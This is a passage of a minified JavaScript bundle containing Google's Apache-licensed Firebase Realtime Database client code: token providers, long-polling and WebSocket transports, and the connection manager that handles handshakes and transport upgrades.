 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eV{constructor(e,n){this.appCheckProvider=n,this.appName=e.name,rr(e)&&e.settings.appCheckToken&&(this.serverAppAppCheckToken=e.settings.appCheckToken),this.appCheck=n==null?void 0:n.getImmediate({optional:!0}),this.appCheck||n==null||n.get().then(i=>this.appCheck=i)}getToken(e){if(this.serverAppAppCheckToken){if(e)throw new Error("Attempted reuse of `FirebaseServerApp.appCheckToken` after previous usage failed.");return Promise.resolve({token:this.serverAppAppCheckToken})}return this.appCheck?this.appCheck.getToken(e):new Promise((n,i)=>{setTimeout(()=>{this.appCheck?this.getToken(e).then(n,i):n(null)},0)})}addTokenChangeListener(e){var n;(n=this.appCheckProvider)===null||n===void 0||n.get().then(i=>i.addTokenListener(e))}notifyForInvalidToken(){oi(`Provided AppCheck credentials for the app named "${this.appName}" are invalid. This usually indicates your app was not initialized correctly.`)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tV{constructor(e,n,i){this.appName_=e,this.firebaseOptions_=n,this.authProvider_=i,this.auth_=null,this.auth_=i.getImmediate({optional:!0}),this.auth_||i.onInit(s=>this.auth_=s)}getToken(e){return this.auth_?this.auth_.getToken(e).catch(n=>n&&n.code==="auth/token-not-initialized"?(Vn("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(n)):new Promise((n,i)=>{setTimeout(()=>{this.auth_?this.getToken(e).then(n,i):n(null)},0)})}addTokenChangeListener(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then(n=>n.addAuthTokenListener(e))}removeTokenChangeListener(e){this.authProvider_.get().then(n=>n.removeAuthTokenListener(e))}notifyForInvalidToken(){let e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',oi(e)}}class Qf{constructor(e){this.accessToken=e}getToken(e){return Promise.resolve({accessToken:this.accessToken})}addTokenChangeListener(e){e(this.accessToken)}removeTokenChangeListener(e){}notifyForInvalidToken(){}}Qf.OWNER="owner";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const X_="5",tN="v",nN="s",iN="r",rN="f",sN=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,aN="ls",oN="p",iv="ac",lN="websocket",cN="long_polling";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uN{constructor(e,n,i,s,o=!1,c="",d=!1,f=!1,p=null){this.secure=n,this.namespace=i,this.webSocketOnly=s,this.nodeAdmin=o,this.persistenceKey=c,this.includeNamespaceInQueryParams=d,this.isUsingEmulator=f,this.emulatorOptions=p,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=Lo.get("host:"+e)||this._host}isCacheableHost(){return this.internalHost.substr(0,2)==="s-"}isCustomHost(){return this._domain!=="firebaseio.com"&&this._domain!=="firebaseio-demo.com"}get host(){return this._host}set host(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&Lo.set("host:"+this._host,this.internalHost))}toString(){let e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e}toURLString(){const e=this.secure?"https://":"http://",n=this.includeNamespaceInQueryParams?`?ns=${this.namespace}`:"";return`${e}${this.host}/${n}`}}function nV(t){return t.host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams}function dN(t,e,n){ye(typeof e=="string","typeof type must == string"),ye(typeof n=="object","typeof params must == object");let i;if(e===lN)i=(t.secure?"wss://":"ws://")+t.internalHost+"/.ws?";else if(e===cN)i=(t.secure?"https://":"http://")+t.internalHost+"/.lp?";else throw new Error("Unknown connection type: "+e);nV(t)&&(n.ns=t.namespace);const s=[];return zn(n,(o,c)=>{s.push(o+"="+c)}),i+s.join("&")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class iV{constructor(){this.counters_={}}incrementCounter(e,n=1){ns(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=n}get(){return YM(this.counters_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const h0={},f0={};function Z_(t){const e=t.toString();return h0[e]||(h0[e]=new iV),h0[e]}function rV(t,e){const n=t.toString();return f0[n]||(f0[n]=e()),f0[n]}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sV{constructor(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}closeAfter(e,n){this.closeAfterResponse=e,this.onClose=n,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)}handleResponse(e,n){for(this.pendingResponses[e]=n;this.pendingResponses[this.currentResponseNum];){const i=this.pendingResponses[this.currentResponseNum];delete this.pendingResponses[this.currentResponseNum];for(let s=0;s<i.length;++s)i[s]&&zc(()=>{this.onMessage_(i[s])});if(this.currentResponseNum===this.closeAfterResponse){this.onClose&&(this.onClose(),this.onClose=null);break}this.currentResponseNum++}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const vE="start",aV="close",oV="pLPCommand",lV="pRTLPCB",hN="id",fN="pw",mN="ser",cV="cb",uV="seg",dV="ts",hV="d",fV="dframe",pN=1870,gN=30,mV=pN-gN,pV=25e3,gV=3e4;class Zl{constructor(e,n,i,s,o,c,d){this.connId=e,this.repoInfo=n,this.applicationId=i,this.appCheckToken=s,this.authToken=o,this.transportSessionId=c,this.lastSessionId=d,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=eh(e),this.stats_=Z_(n),this.urlFn=f=>(this.appCheckToken&&(f[iv]=this.appCheckToken),dN(n,cN,f))}open(e,n){this.curSegmentNum=0,this.onDisconnect_=n,this.myPacketOrderer=new sV(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout(()=>{this.log_("Timed out trying to connect."),this.onClosed_(),this.connectTimeoutTimer_=null},Math.floor(gV)),G7(()=>{if(this.isClosed_)return;this.scriptTagHolder=new J_((...o)=>{const[c,d,f,p,v]=o;if(this.incrementIncomingBytes_(o),!!this.scriptTagHolder)if(this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null),this.everConnected_=!0,c===vE)this.id=d,this.password=f;else if(c===aV)d?(this.scriptTagHolder.sendNewPolls=!1,this.myPacketOrderer.closeAfter(d,()=>{this.onClosed_()})):this.onClosed_();else throw new Error("Unrecognized command received: "+c)},(...o)=>{const[c,d]=o;this.incrementIncomingBytes_(o),this.myPacketOrderer.handleResponse(c,d)},()=>{this.onClosed_()},this.urlFn);const i={};i[vE]="t",i[mN]=Math.floor(Math.random()*1e8),this.scriptTagHolder.uniqueCallbackIdentifier&&(i[cV]=this.scriptTagHolder.uniqueCallbackIdentifier),i[tN]=X_,this.transportSessionId&&(i[nN]=this.transportSessionId),this.lastSessionId&&(i[aN]=this.lastSessionId),this.applicationId&&(i[oN]=this.applicationId),this.appCheckToken&&(i[iv]=this.appCheckToken),typeof location<"u"&&location.hostname&&sN.test(location.hostname)&&(i[iN]=rN);const s=this.urlFn(i);this.log_("Connecting via long-poll to "+s),this.scriptTagHolder.addTag(s,()=>{})})}start(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)}static forceAllow(){Zl.forceAllow_=!0}static forceDisallow(){Zl.forceDisallow_=!0}static isAvailable(){return Zl.forceAllow_?!0:!Zl.forceDisallow_&&typeof document<"u"&&document.createElement!=null&&!Q7()&&!K7()}markConnectionHealthy(){}shutdown_(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)}onClosed_(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))}close(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())}send(e){const n=Nn(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const i=NC(n),s=J4(i,mV);for(let o=0;o<s.length;o++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,s.length,s[o]),this.curSegmentNum++}addDisconnectPingFrame(e,n){this.myDisconnFrame=document.createElement("iframe");const i={};i[fV]="t",i[hN]=e,i[fN]=n,this.myDisconnFrame.src=this.urlFn(i),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)}incrementIncomingBytes_(e){const n=Nn(e).length;this.bytesReceived+=n,this.stats_.incrementCounter("bytes_received",n)}}class J_{constructor(e,n,i,s){this.onDisconnect=i,this.urlFn=s,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(Math.random()*1e8),this.sendNewPolls=!0;{this.uniqueCallbackIdentifier=F7(),window[oV+this.uniqueCallbackIdentifier]=e,window[lV+this.uniqueCallbackIdentifier]=n,this.myIFrame=J_.createIFrame_();let o="";this.myIFrame.src&&this.myIFrame.src.substr(0,11)==="javascript:"&&(o='<script>document.domain="'+document.domain+'";<\/script>');const c="<html><body>"+o+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(c),this.myIFrame.doc.close()}catch(d){Vn("frame writing exception"),d.stack&&Vn(d.stack),Vn(d)}}}static createIFrame_(){const e=document.createElement("iframe");if(e.style.display="none",document.body){document.body.appendChild(e);try{e.contentWindow.document||Vn("No IE domain setting required")}catch{const i=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+i+"';document.close();})())"}}else throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e}close(){this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.textContent="",setTimeout(()=>{this.myIFrame!==null&&(document.body.removeChild(this.myIFrame),this.myIFrame=null)},Math.floor(0)));const e=this.onDisconnect;e&&(this.onDisconnect=null,e())}startLongPoll(e,n){for(this.myID=e,this.myPW=n,this.alive=!0;this.newRequest_(););}newRequest_(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(this.pendingSegs.length>0?2:1)){this.currentSerial++;const e={};e[hN]=this.myID,e[fN]=this.myPW,e[mN]=this.currentSerial;let n=this.urlFn(e),i="",s=0;for(;this.pendingSegs.length>0&&this.pendingSegs[0].d.length+gN+i.length<=pN;){const c=this.pendingSegs.shift();i=i+"&"+uV+s+"="+c.seg+"&"+dV+s+"="+c.ts+"&"+hV+s+"="+c.d,s++}return n=n+i,this.addLongPollTag_(n,this.currentSerial),!0}else return!1}enqueueSegment(e,n,i){this.pendingSegs.push({seg:e,ts:n,d:i}),this.alive&&this.newRequest_()}addLongPollTag_(e,n){this.outstandingRequests.add(n);const i=()=>{this.outstandingRequests.delete(n),this.newRequest_()},s=setTimeout(i,Math.floor(pV)),o=()=>{clearTimeout(s),i()};this.addTag(e,o)}addTag(e,n){setTimeout(()=>{try{if(!this.sendNewPolls)return;const i=this.myIFrame.doc.createElement("script");i.type="text/javascript",i.async=!0,i.src=e,i.onload=i.onreadystatechange=function(){const s=i.readyState;(!s||s==="loaded"||s==="complete")&&(i.onload=i.onreadystatechange=null,i.parentNode&&i.parentNode.removeChild(i),n())},i.onerror=()=>{Vn("Long-poll script failed to load: "+e),this.sendNewPolls=!1,this.close()},this.myIFrame.doc.body.appendChild(i)}catch{}},Math.floor(1))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yV=16384,vV=45e3;let Mm=null;typeof MozWebSocket<"u"?Mm=MozWebSocket:typeof WebSocket<"u"&&(Mm=WebSocket);class gr{constructor(e,n,i,s,o,c,d){this.connId=e,this.applicationId=i,this.appCheckToken=s,this.authToken=o,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=eh(this.connId),this.stats_=Z_(n),this.connURL=gr.connectionURL_(n,c,d,s,i),this.nodeAdmin=n.nodeAdmin}static connectionURL_(e,n,i,s,o){const c={};return c[tN]=X_,typeof location<"u"&&location.hostname&&sN.test(location.hostname)&&(c[iN]=rN),n&&(c[nN]=n),i&&(c[aN]=i),s&&(c[iv]=s),o&&(c[oN]=o),dN(e,lN,c)}open(e,n){this.onDisconnect=n,this.onMessage=e,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,Lo.set("previous_websocket_failure",!0);try{let i;rO(),this.mySock=new Mm(this.connURL,[],i)}catch(i){this.log_("Error instantiating WebSocket.");const s=i.message||i.data;s&&this.log_(s),this.onClosed_();return}this.mySock.onopen=()=>{this.log_("Websocket connected."),this.everConnected_=!0},this.mySock.onclose=()=>{this.log_("Websocket connection was disconnected."),this.mySock=null,this.onClosed_()},this.mySock.onmessage=i=>{this.handleIncomingFrame(i)},this.mySock.onerror=i=>{this.log_("WebSocket error.  Closing connection.");const s=i.message||i.data;s&&this.log_(s),this.onClosed_()}}start(){}static forceDisallow(){gr.forceDisallow_=!0}static isAvailable(){let e=!1;if(typeof navigator<"u"&&navigator.userAgent){const n=/Android ([0-9]{0,}\.[0-9]{0,})/,i=navigator.userAgent.match(n);i&&i.length>1&&parseFloat(i[1])<4.4&&(e=!0)}return!e&&Mm!==null&&!gr.forceDisallow_}static previouslyFailed(){return Lo.isInMemoryStorage||Lo.get("previous_websocket_failure")===!0}markConnectionHealthy(){Lo.remove("previous_websocket_failure")}appendFrame_(e){if(this.frames.push(e),this.frames.length===this.totalFrames){const n=this.frames.join("");this.frames=null;const i=yd(n);this.onMessage(i)}}handleNewFrameCount_(e){this.totalFrames=e,this.frames=[]}extractFrameCount_(e){if(ye(this.frames===null,"We already have a frame buffer"),e.length<=6){const n=Number(e);if(!isNaN(n))return this.handleNewFrameCount_(n),null}return this.handleNewFrameCount_(1),e}handleIncomingFrame(e){if(this.mySock===null)return;const n=e.data;if(this.bytesReceived+=n.length,this.stats_.incrementCounter("bytes_received",n.length),this.resetKeepAlive(),this.frames!==null)this.appendFrame_(n);else{const i=this.extractFrameCount_(n);i!==null&&this.appendFrame_(i)}}send(e){this.resetKeepAlive();const n=Nn(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const i=J4(n,yV);i.length>1&&this.sendString_(String(i.length));for(let s=0;s<i.length;s++)this.sendString_(i[s])}shutdown_(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)}onClosed_(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))}close(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())}resetKeepAlive(){clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval(()=>{this.mySock&&this.sendString_("0"),this.resetKeepAlive()},Math.floor(vV))}sendString_(e){try{this.mySock.send(e)}catch(n){this.log_("Exception thrown from WebSocket.send():",n.message||n.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}}}gr.responsesRequiredToBeHealthy=2;gr.healthyTimeout=3e4;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sd{static get ALL_TRANSPORTS(){return[Zl,gr]}static get IS_TRANSPORT_INITIALIZED(){return this.globalTransportInitialized_}constructor(e){this.initTransports_(e)}initTransports_(e){const n=gr&&gr.isAvailable();let i=n&&!gr.previouslyFailed();if(e.webSocketOnly&&(n||oi("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),i=!0),i)this.transports_=[gr];else{const s=this.transports_=[];for(const o of Sd.ALL_TRANSPORTS)o&&o.isAvailable()&&s.push(o);Sd.globalTransportInitialized_=!0}}initialTransport(){if(this.transports_.length>0)return this.transports_[0];throw new Error("No transports available")}upgradeTransport(){return this.transports_.length>1?this.transports_[1]:null}}Sd.globalTransportInitialized_=!1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _V=6e4,wV=5e3,bV=10*1024,xV=100*1024,m0="t",_E="d",AV="s",wE="r",EV="e",bE="o",xE="a",AE="n",EE="p",TV="h";class CV{constructor(e,n,i,s,o,c,d,f,p,v){this.id=e,this.repoInfo_=n,this.applicationId_=i,this.appCheckToken_=s,this.authToken_=o,this.onMessage_=c,this.onReady_=d,this.onDisconnect_=f,this.onKill_=p,this.lastSessionId=v,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=eh("c:"+this.id+":"),this.transportManager_=new Sd(n),this.log_("Connection created"),this.start_()}start_(){const e=this.transportManager_.initialTransport();this.conn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.conn_),i=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout(()=>{this.conn_&&this.conn_.open(n,i)},Math.floor(0));const s=e.healthyTimeout||0;s>0&&(this.healthyTimeout_=dd(()=>{this.healthyTimeout_=null,this.isHealthy_||(this.conn_&&this.conn_.bytesReceived>xV?(this.log_("Connection exceeded healthy timeout but has received "+this.conn_.bytesReceived+" bytes.  Marking connection healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()):this.conn_&&this.conn_.bytesSent>bV?this.log_("Connection exceeded healthy timeout but has sent "+this.conn_.bytesSent+" bytes.  Leaving connection alive."):(this.log_("Closing unhealthy connection after timeout."),this.close()))},Math.floor(s)))}nextTransportId_(){return"c:"+this.id+":"+this.connectionCount++}disconnReceiver_(e){return n=>{e===this.conn_?this.onConnectionLost_(n):e===this.secondaryConn_?(this.log_("Secondary connection lost."),this.onSecondaryConnectionLost_()):this.log_("closing an old connection")}}connReceiver_(e){return n=>{this.state_!==2&&(e===this.rx_?this.onPrimaryMessageReceived_(n):e===this.secondaryConn_?this.onSecondaryMessageReceived_(n):this.log_("message on old connection"))}}sendRequest(e){const n={t:"d",d:e};this.sendData_(n)}tryCleanupConnection(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)}onSecondaryControl_(e){if(m0 in e){const n=e[m0];n===xE?this.upgradeIfSecondaryHealthy_():n===wE?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),(this.tx_===this.secondaryConn_||this.rx_===this.secondaryConn_)&&this.close()):n===bE&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_())}}onSecondaryMessageReceived_(e){const n=Ku("t",e),i=Ku("d",e);if(n==="c")this.onSecondaryControl_(i);else if(n==="d")this.pendingDataMessages.push(i);else throw new Error("Unknown protocol layer: "+n)}upgradeIfSecondaryHealthy_(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:EE,d:{}}}))}proceedWithUpgrade_(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:xE,d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:AE,d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()}onPrimaryMessageReceived_(e){const n=Ku("t",e),i=Ku("d",e);n==="c"?this.onControl_(i):n==="d"&&this.onDataMessage_(i)}onDataMessage_(e){this.onPrimaryResponse_(),this.onMessage_(e)}onPrimaryResponse_(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))}onControl_(e){const n=Ku(m0,e);if(_E in e){const i=e[_E];if(n===TV){const s=Object.assign({},i);this.repoInfo_.isUsingEmulator&&(s.h=this.repoInfo_.host),this.onHandshake_(s)}else if(n===AE){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(let s=0;s<this.pendingDataMessages.length;++s)this.onDataMessage_(this.pendingDataMessages[s]);this.pendingDataMessages=[],this.tryCleanupConnection()}else n===AV?this.onConnectionShutdown_(i):n===wE?this.onReset_(i):n===EV?nv("Server Error: "+i):n===bE?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):nv("Unknown control packet command: "+n)}}onHandshake_(e){const n=e.ts,i=e.v,s=e.h;this.sessionId=e.s,this.repoInfo_.host=s,this.state_===0&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,n),X_!==i&&oi("Protocol version mismatch detected"),this.tryStartUpgrade_())}tryStartUpgrade_(){const e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)}startUpgrade_(e){this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.secondaryConn_),i=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,i),dd(()=>{this.secondaryConn_&&(this.log_("Timed out trying to upgrade."),this.secondaryConn_.close())},Math.floor(_V))}onReset_(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,this.state_===1?this.close():(this.closeConnections_(),this.start_())}onConnectionEstablished_(e,n){this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(n,this.sessionId),this.onReady_=null),this.primaryResponsesRequired_===0?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):dd(()=>{this.sendPingOnPrimaryIfNecessary_()},Math.floor(wV))}sendPingOnPrimaryIfNecessary_(){!this.isHealthy_&&this.state_===1&&(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:EE,d:{}}}))}onSecondaryConnectionLost_(){const e=this.secondaryConn_;this.secondaryConn_=null,(this.tx_===e||this.rx_===e)&&this.close()}onConnectionLost_(e){this.conn_=null,!e&&this.state_===0?(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&(Lo.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)):this.state_===1&&this.log_("Realtime connection lost."),this.close()}onConnectionShutdown_(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()}sendData_(e){if(this.state_!==1)throw"Connection is not connected";this.tx_.send(e)}close(){this.state_!==2&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))}closeConnections_(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yN{put(e,n,i,s){}merge(e,n,i,s){}refreshAuthToken(e){}refreshAppCheckToken(e){}onDisconnectPut(e,n,i){}onDisconnectMerge(e,n,i){}onDisconnectCancel(e,n){}reportStats(e){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
